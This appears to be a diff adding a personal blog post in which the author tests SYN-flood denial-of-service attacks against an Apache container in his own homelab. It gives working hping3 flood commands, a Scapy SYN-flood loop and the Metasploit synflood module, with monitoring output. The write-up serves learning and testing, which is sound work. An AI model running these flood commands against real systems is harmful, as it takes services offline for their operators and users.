@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      Week 10 - DDoS In Practice
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Week 10 - DDoS In Practice" />
+<meta name="author" content="Jake Mullins" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This week, I’m going to take a look at some variants of DDoS attacks, particularly kinds that can be executed using out-of-the-box tools and basic scripting." />
+<meta property="og:description" content="This week, I’m going to take a look at some variants of DDoS attacks, particularly kinds that can be executed using out-of-the-box tools and basic scripting." />
+<link rel="canonical" href="http://localhost:4000/year-of-hacking-0xa" />
+<meta property="og:url" content="http://localhost:4000/year-of-hacking-0xa" />
+<meta property="og:site_name" content="Jake Mullins" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-10T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Week 10 - DDoS In Practice" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jake Mullins"},"dateModified":"2024-06-10T00:00:00-06:00","datePublished":"2024-06-10T00:00:00-06:00","description":"This week, I’m going to take a look at some variants of DDoS attacks, particularly kinds that can be executed using out-of-the-box tools and basic scripting.","headline":"Week 10 - DDoS In Practice","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/year-of-hacking-0xa"},"url":"http://localhost:4000/year-of-hacking-0xa"}</script>
+<!-- End Jekyll SEO tag -->
+
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Jake Mullins" />
+
+  <!-- Favicon -->
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
+  <link rel="manifest" href="/assets/images/favicon/site.webmanifest">
+  <link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+  <link rel="shortcut icon" href="/assets/images/favicon/favicon.ico">
+  <meta name="msapplication-TileColor" content="#00aba9">
+  <meta name="msapplication-config" content="/assets/images/favicon/browserconfig.xml">
+  <meta name="theme-color" content="#ffffff">
+  <!-- Favicon -->
+
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/">home...</a>
+<h1 class="post-title">Week 10 - DDoS In Practice</h1>
+<p class="post-date text-bold">
+  
+  
+    <span class="text-upcase">June 2024</span>
+  
+
+
+  
+  
+  (1460 Words, 
+  9 Minutes)
+  
+
+</p>
+
+
+  <div class="">
+    
+    <span class="tag">year-of-hacking</span>
+    
+    <span class="tag">python</span>
+    
+  </div>
+
+
+<p>This week, I’m going to take a look at some variants of DDoS attacks, particularly kinds that can be executed using out-of-the-box tools and basic scripting.</p>
+
+<p>To me, the concept <strong>D</strong>enial <strong>o</strong>f <strong>S</strong>ervice implies exploiting some kind of vulnerability to cause a crash or something similar that causes a service to stop functioning. A <strong>D</strong>istributed <strong>D</strong>enial <strong>o</strong>f <strong>S</strong>ervice implies overloading an application by sheer traffic quantity.</p>
+<h1 id="setup">Setup</h1>
+<p>On a machine in my homelab, I set up an Apache web server on port 8080 using docker with a cap of 512 Megabytes of memory using the command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">--name</span> apache <span class="nt">--memory</span><span class="o">=</span><span class="s2">"512m"</span> <span class="nt">-p</span> 8080:80 httpd
+</code></pre></div></div>
+
+<p>When curled, the Apache server returns this simple HTML.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jakemull@optiplex-9020-1:~/ddos$ curl localhost:8080
+&lt;html&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</code></pre></div></div>
+
+<p>In a different tmux pane, I will run this python script that will alert me when the server is no longer responding:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+  
+<span class="n">IP_ADDR</span> <span class="o">=</span> <span class="s">"192.168.5.140"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="s">"8080"</span>
+<span class="n">BASE_URL</span> <span class="o">=</span> <span class="s">f"http://</span><span class="si">{</span><span class="n">IP_ADDR</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s">/index.html"</span>
+  
+<span class="n">TYPICAL_RESPONSE</span> <span class="o">=</span> <span class="s">"&lt;html&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;"</span>
+  
+<span class="n">start_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span>
+  
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">response_text</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE_URL</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">).</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">IP_ADDR</span><span class="si">}</span><span class="s"> is NOT working: </span><span class="si">{</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span><span class="si">}</span><span class="s"> - Reason: ConnectionError"</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">continue</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">Timeout</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">IP_ADDR</span><span class="si">}</span><span class="s"> is NOT working: </span><span class="si">{</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span><span class="si">}</span><span class="s"> - Reason: Timeout"</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">continue</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="n">response_text</span> <span class="o">!=</span> <span class="n">TYPICAL_RESPONSE</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">IP_ADDR</span><span class="si">}</span><span class="s"> is not delivering correct content: </span><span class="si">{</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">IP_ADDR</span><span class="si">}</span><span class="s"> is working: </span><span class="si">{</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>One of the most simple methods for doing a DDoS attack is called a SYN Flood. In a typical TCP connection, communication is initiated when:</p>
+<ul>
+  <li>Host A sends a TCP segment with the SYN flag activated to Host B.</li>
+  <li>Host B responds with a TCP segment with both the SYN/ACK flags activated to Host A</li>
+  <li>Host A responds with a TCP segment with the ACK flag activated to Host B.</li>
+</ul>
+
+<p>This is called the 3-way handshake. In order to maintain the state of a connection, both hosts need to allocate some memory. During the handshake, while Host B is waiting for the segment with the ACK flag from Host A in step 3, Host B has allocated a set amount of memory that it will hold for a time until it decides to let it go. This can be exploited by an attacker to make a host allocate too much memory, eventually causing a crash. This is done by sending tens of thousands of SYN segments. Say it takes 84 bytes to keep the state of a TCP connection, each connection state is held for 10 seconds and an attacker can send 10,000 SYN segments, then it will force the victim to allocate 8.4 MB of RAM after 10 seconds. If an attacker can send 10 million segments a second, it will force the machine to allocate 8.4 GB, enough to cause significant lag, if not crash a system entirely.</p>
+
+<h1 id="hping3">hping3</h1>
+<p><code class="language-plaintext highlighter-rouge">hping3</code> is a command-line tool that allows a user to send arbitrary packets to a host. It has a lot of really useful tools for legitimate network engineer purposes, like the <code class="language-plaintext highlighter-rouge">-z</code> flag that allows you to increment/decrement the TTL of the packets. We’re gonna use the <code class="language-plaintext highlighter-rouge">--fast</code>, <code class="language-plaintext highlighter-rouge">--faster</code>, and <code class="language-plaintext highlighter-rouge">--flood</code> flags.</p>
+
+<p>Using the <code class="language-plaintext highlighter-rouge">--fast</code> flag is not enough to cause a DDoS, after running for 5 minutes, there’s only one error:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>23:31<span class="o">}</span>~/ddos ➭ <span class="nb">sudo </span>hping3 <span class="nt">-S</span> <span class="nt">--fast</span> 192.168.5.140 <span class="nt">-p</span> 8080
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>23:26<span class="o">}</span>~/ddos ➭ python3 alert.py
+192.168.5.140 is NOT working: 0:00:17.168187 - Reason: ConnectionError
+192.168.5.140 is working: 0:04:41.516566
+</code></pre></div></div>
+
+<p>Here’s the results with the <code class="language-plaintext highlighter-rouge">--faster</code> flag:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>23:31<span class="o">}</span>~/ddos ➭ <span class="nb">sudo </span>hping3 <span class="nt">-S</span> <span class="nt">--faster</span> 192.168.5.140 <span class="nt">-p</span> 8080
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>23:32<span class="o">}</span>~/ddos ➭ python3 alert.py
+192.168.5.140 is NOT working: 0:00:25.130376 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:32.890300 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:38.131361 - Reason: Timeout
+192.168.5.140 is NOT working: 0:00:42.402327 - Reason: Timeout
+192.168.5.140 is NOT working: 0:00:49.479263 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:56.347507 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:01:00.612899 - Reason: Timeout
+192.168.5.140 is NOT working: 0:01:02.748265 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:01:07.172784 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:01:09.200692 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:01:15.700279 - Reason: ConnectionError
+</code></pre></div></div>
+
+<p>And here’s the results with the <code class="language-plaintext highlighter-rouge">--flood</code> flag, which nearly crashed my computer and made the Wendigoon video I was watching on the other monitor become nearly incomprehensible.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>23:34<span class="o">}</span>~/ddos ➭ <span class="nb">sudo </span>hping3 <span class="nt">-S</span> <span class="nt">--flood</span> 192.168.5.140 <span class="nt">-p</span> 8080
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>23:35<span class="o">}</span>~/ddos ➭ python3 alert.py
+192.168.5.140 is NOT working: 0:00:03.136107 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:05.146903 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:07.159407 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:09.229592 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:11.359851 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:13.387867 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:15.396786 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:17.727767 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:19.734578 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:21.898394 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:23.938181 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:26.016161 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:28.019673 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:30.051269 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:32.268846 - Reason: ConnectionError
+192.168.5.140 is NOT working: 0:00:36.057949 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:38.252743 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:40.258710 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:42.261723 - Reason: ConnectionError    
+</code></pre></div></div>
+
+<p>You can notice that as expected, the higher rates of malicious packets crash the target earlier.</p>
+
+<p>Wireshark with the filter <code class="language-plaintext highlighter-rouge">tcp.flags.syn == 1 and tcp.dstport == 8080</code> shows 234,017 segments in 60 seconds.</p>
+
+<h1 id="scapy">Scapy</h1>
+<p>Scapy is a very powerful tool that allows a programmer to send arbitrary packets, giving the user control of basically every field. We can use this simple script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">target_addr</span> <span class="o">=</span> <span class="s">'192.168.5.140'</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">8080</span>
+
+<span class="n">p</span><span class="o">=</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">target_addr</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">flags</span><span class="o">=</span><span class="s">"S"</span><span class="p">,</span> <span class="err"> </span><span class="n">sport</span><span class="o">=</span><span class="n">RandShort</span><span class="p">(),</span> <span class="err"> </span><span class="n">dport</span><span class="o">=</span><span class="n">target_port</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+	<span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div>
+<p>To send packets to port 8080 basically as fast as a single thread can create them. I would like to learn more about multithreading/multiprocessing in the future, and coding up an attack like this would be an excellent application of that technique, so I’ll put off improving this attack for a future post.</p>
+
+<p>Wireshark shows that this script is able to generate about 750 SYN segments over 60 seconds.</p>
+
+<h1 id="metasploit-packages">Metasploit packages</h1>
+<p>Searching through the current Metasploit packages with the keyword <code class="language-plaintext highlighter-rouge">dos</code> reveals a subset of packages under the <code class="language-plaintext highlighter-rouge">auxiliary/dos</code> path, which contains 119 premade packages. The vast majority of them are platform or software specific, including some alarming ones like <code class="language-plaintext highlighter-rouge">auxiliary/dos/apple_ios/webkit_backdrop_filter_blur</code> with the description <code class="language-plaintext highlighter-rouge">iOS Safari Denial of Service with CSS</code> from 2018, and one called <code class="language-plaintext highlighter-rouge">auxiliary/dos/http/metasploit_httphandler_dos</code> that as far as I can tell, DoS’s Metasploit itself.</p>
+
+<p>Metasploit comes with a package called <code class="language-plaintext highlighter-rouge">dos/tcp/synflood</code> that executes a SYN flood attack. I would typically include the output of the <code class="language-plaintext highlighter-rouge">alert.py</code> script, but as far as I can tell, running it the first time completely bricked the test machine in my home lab. However, using Wireshark reveals that over 60 seconds, it generates something like 82k packets.</p>
+
+<h1 id="finishing-up">Finishing up</h1>
+<p>I’m surprised that the Metasploit package wasn’t the most effective in terms of packets per second. Perhaps looking into updating the package would be an interesting future blog post. SYN floods are just about the easiest DoS attack to execute, so in practice, any modern firewall would catch them. I would like the chance to test this again once I acquire a nicer firewall for the home lab.</p>
+
+<h1 id="music-from-this-week">Music from this week</h1>
+<p><a href="https://open.spotify.com/album/6jWde94ln40epKIQCd8XUh?si=3jG7RSh1SIWCTHIRroR1aA">Toxicity</a> by System of a Down</p>
+
+<p><a href="https://open.spotify.com/album/0BwWUstDMUbgq2NYONRqlu?si=AJvaEJmwRf2xTDKpEUI-AA">Rumours</a> by Fleetwood Mac</p>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2024&nbsp;Jake Mullins
+          &nbsp;
+          •
+          &nbsp;Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>
+        </div>
+      </div>
+    </main></body>
+</html>
